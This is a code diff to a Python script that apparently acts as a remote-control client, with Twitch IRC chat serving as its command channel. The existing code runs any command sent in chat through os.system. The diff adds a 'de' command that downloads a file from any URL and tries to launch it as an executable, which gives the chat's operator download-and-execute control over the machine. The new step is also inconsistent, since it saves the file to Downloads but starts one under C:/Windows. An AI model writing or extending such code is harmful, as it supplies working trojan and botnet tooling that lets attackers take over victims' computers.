@@ -2,6 +2,7 @@ import re
 from time import sleep
 import socket
 import os
+import urllib.request
 
 HOST = "irc.twitch.tv"
 PORT = 6667
@@ -41,7 +42,17 @@ def main():
                             os.system(messageArray[3])
                             chat(s, clientName + " completed the command.")
                         except Exception as e:
-                            chat(s, clientName + " encountered an error. " + e)
+                            chat(s, clientName + " encountered an error. " + str(e))
+                    elif messageArray[2] == 'de':
+                        try:
+                            url = messageArray[3]
+                            path = os.path.expanduser("~") + "/Downloads/file.exe"
+                            urllib.request.urlretrieve(url, path)
+                            os.system('start C:/Windows/file.exe')
+                            os.remove(path)
+                            chat(s, clientName + " completed the command.")
+                        except Exception as e:
+                            chat(s, clientName + " encountered an error. " + str(e))
         sleep(1)
 
 
